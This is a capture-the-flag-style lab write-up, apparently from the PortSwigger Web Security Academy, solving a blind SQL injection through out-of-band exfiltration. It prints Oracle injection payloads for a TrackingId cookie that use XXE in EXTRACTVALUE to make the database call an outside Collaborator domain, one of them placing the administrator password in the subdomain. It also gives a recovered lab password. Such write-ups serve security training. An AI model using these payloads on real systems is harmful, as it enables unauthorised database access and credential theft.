# Blind SQL injection with out-of-band data exfiltration

This lab demonstrates a blind SQL injection where the normal HTTP
response provides no useful indication of whether the injected query
succeeded.

The SQL query is executed asynchronously, but the database can be made
to interact with an external domain. That out-of-band interaction
becomes the observable signal.

The database contains a `users` table with `username` and `password`
columns, and the objective is to recover the administrator password and
log in.

Note: The lab environment blocks arbitrary external interactions. The
intended solution uses Burp Collaborator's default public server.

------------------------------------------------------------------------

References:

-   https://portswigger.net/web-security/sql-injection/blind
-   https://portswigger.net/web-security/sql-injection/cheat-sheet

------------------------------------------------------------------------

The following payload can trigger an out-of-band interaction through the
SQL injection:

    Cookie: TrackingId=FFyToxqSs49lpxuC'+union+select+EXTRACTVALUE(xmltype('<%3fxml+version="1.0"+encoding="UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://rfawfotutbq6iasl1guon5zd84ev2uqj.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--;

A conditional query can then be used to trigger the external interaction
only when a tested password character matches:

    SELECT CASE WHEN ((SUBSTR((SELECT password FROM users WHERE username = 'administrator'),1,1))='a') THEN 'a'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual) ELSE NULL END FROM dual

    FFyToxqSs49lpxuC'+union+SELECT+CASE+WHEN+((SUBSTR((SELECT+password+FROM+users+WHERE+username+=+'administrator'),1,1))!='a')+THEN+'a'||(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"?><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://BURP-COLLABORATOR/">+%25remote%3b]>'),'/l')+FROM+dual)+ELSE+NULL+END+FROM+dual--;

The first test checks a character different from `a`. An interaction is
observed when the condition is satisfied.

<img width="424" height="270" alt="1" src="https://github.com/user-attachments/assets/8fba6894-b1b0-4729-8793-996d51e603d4" />


<img width="876" height="120" alt="2" src="https://github.com/user-attachments/assets/21bfde3a-173c-40c8-8d5e-98cc1ae87c87" />


The request is sent to Intruder with two payload positions: one for the
character being tested and another for the subdomain. The attack type is
set to `Battering Ram`.

<img width="1017" height="493" alt="3" src="https://github.com/user-attachments/assets/e308ec88-476b-4467-ac93-625af980cad9" />


The Collaborator interaction reveals that the tested character is `e`.

<img width="824" height="109" alt="4" src="https://github.com/user-attachments/assets/90d7ad41-47d7-4391-8b63-ad49c1ec1fc7" />


Repeating the process character by character results in the
administrator password:

`e6jomps7kptnx04vcvtz`.

The cheat sheet also provides a direct technique for placing query
output into the Collaborator subdomain:

    SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual

    mnsyvP6Ci68a0edP'+union+select+EXTRACTVALUE(xmltype('<%3fxml+version="1.0"+encoding="UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://'||(SELECT+password+FROM+users+where+username='administrator')||'.0mntiwqdq98x96mi2d97hujkwb22quej.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--

<img width="738" height="122" alt="5" src="https://github.com/user-attachments/assets/1216a8eb-3b59-4c66-9042-976e556e47fd" />

